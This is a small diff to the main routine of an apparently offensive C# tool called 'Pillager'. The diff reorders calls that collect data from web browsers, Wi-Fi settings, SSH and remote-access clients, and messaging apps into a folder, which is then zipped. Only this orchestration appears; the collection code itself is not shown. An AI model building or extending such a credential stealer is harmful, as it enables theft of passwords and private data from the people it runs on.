@@ -19,6 +19,15 @@ namespace Pillager
             if (File.Exists(savezippath)) File.Delete(savezippath);
             Directory.CreateDirectory(savepath);
 
+            //Browsers
+            IE.Save(savepath);
+            OldSogou.Save(savepath);//SogouExplorer < 12.x
+            Chrome.Save(savepath);
+            FireFox.Save(savepath);
+
+            //Others
+            Wifi.Save(savepath);
+
             //Tools
             MobaXterm.Save(savepath);
             Xmanager.Save(savepath);
@@ -27,15 +36,6 @@ namespace Pillager
             QQ.Save(savepath);
             Telegram.Save(savepath);
             Skype.Save(savepath);
-
-            //Browsers
-            IE.Save(savepath);
-            OldSogou.Save(savepath);//SogouExplorer < 12.x
-            FireFox.Save(savepath);
-            Chrome.Save(savepath);
-
-            //Others
-            Wifi.Save(savepath);
 
             //ZIP
             ZipFile.CreateFromDirectory(savepath, savezippath);
